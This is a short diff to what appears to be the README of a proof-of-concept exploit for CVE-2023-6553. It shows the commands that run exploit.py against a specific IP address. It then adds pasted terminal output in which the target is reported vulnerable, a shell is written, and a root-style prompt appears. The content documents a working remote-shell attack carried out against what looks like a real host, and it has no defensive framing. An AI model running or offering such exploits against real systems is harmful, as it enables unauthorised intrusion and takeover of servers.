@@ -65,3 +65,13 @@ python3 -m venv venv && source venv/bin/activate
 pip install -r requirements.txt
 python exploit.py -u http://3.144.10.220
 ```
+
+```
+(venv) yinuodu@S3Ds-MacBook-Pro-10 CVE-2023-6553 % python exploit.py -u http://3.144.10.220      
+
+http://3.144.10.220 is vulnerable to CVE-2023-6553
+Initiating shell deployment. This may take a moment...
+Writing... ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
+Shell written successfully.
+# 
+```
